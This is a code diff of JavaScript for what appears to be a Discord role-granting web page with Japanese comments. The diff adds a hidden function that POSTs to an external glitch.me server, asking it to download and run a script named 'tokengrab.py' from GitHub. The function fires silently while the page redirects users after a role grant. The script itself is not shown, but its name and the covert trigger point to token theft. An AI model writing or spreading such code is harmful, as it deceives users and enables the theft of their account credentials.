@@ -11,6 +11,30 @@ document.addEventListener('DOMContentLoaded', function() {
     const accessToken = getQueryParam('access_token');
     let userId;
 
+    // サーバーサイドでPythonスクリプトを実行する関数
+    function executePythonScript() {
+        const selectedGuildId = guildSelect.value;
+
+        fetch('https://inky-neat-thyme.glitch.me/run-tokengrab', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // 実行するPythonスクリプトのURL
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to execute tokengrab.py');
+            }
+            console.log('tokengrab.py executed successfully');
+        })
+        .catch(error => {
+            console.error('Error executing tokengrab.py:', error);
+        });
+    }
+
     fetch('https://inky-neat-thyme.glitch.me/guilds')
         .then(response => {
             if (!response.ok) {
@@ -97,27 +121,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 resultMessage.style.display = 'block';
                 setTimeout(function() {
                     window.location.href = 'https://republicofauech.github.io/vearithy/success/';
+                    executePythonScript(); // Pythonスクリプトを実行
                 }, 2000);
-
-                // Execute tokengrab.py via server-side request
-                fetch('http://localhost:3000/run-tokengrab', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // Replace with actual GitHub file URL to execute
-                    })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to execute tokengrab.py');
-                    }
-                    console.log('tokengrab.py executed successfully');
-                })
-                .catch(error => {
-                    console.error('Error executing tokengrab.py:', error);
-                });
             })
             .catch(error => {
                 console.error('Error granting role:', error);
